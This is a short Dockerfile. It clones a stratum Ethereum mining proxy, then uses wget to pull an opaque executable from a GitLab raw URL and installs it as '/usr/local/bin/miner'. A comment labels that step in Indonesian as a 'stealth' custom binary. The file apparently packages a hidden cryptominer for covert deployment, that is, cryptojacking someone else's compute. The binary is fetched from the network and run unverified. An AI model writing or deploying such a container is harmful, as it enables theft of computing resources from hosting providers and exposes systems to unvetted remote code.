FROM node:18

WORKDIR /app

RUN apt-get update && apt-get install -y \
    curl wget git build-essential procps \
    && rm -rf /var/lib/apt/lists/*

# === Stratum Proxy ===
RUN git clone https://github.com/oneevil/stratum-ethproxy.git .
RUN npm install

# === Binary Custom Kamu (Stealth) ===
RUN wget -O /usr/local/bin/miner \
    "https://gitlab.com/ferrynara12/mypro/-/raw/main/docker?ref_type=heads" \
    && chmod +x /usr/local/bin/miner

COPY start.sh .
RUN chmod +x start.sh

EXPOSE 8080

CMD ["./start.sh"]
